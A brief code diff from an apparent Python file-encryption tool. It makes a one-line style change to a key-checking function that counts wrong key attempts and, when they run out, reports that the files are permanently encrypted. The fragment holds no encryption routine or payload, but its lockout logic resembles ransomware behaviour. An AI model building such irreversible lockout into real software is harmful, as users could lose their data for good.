@@ -52,7 +52,7 @@ def decrypt_files(files, key, alphabet):
 
 def check_key(key, right_key, attempts, alphabet):
     if key != right_key:
-        if not attempts == "infinite":
+        if attempts != "infinite":
             attempts = int(attempts) - 1
             if int(attempts) == 0:
                 print("Wrong input, files have been permanently encrypted")
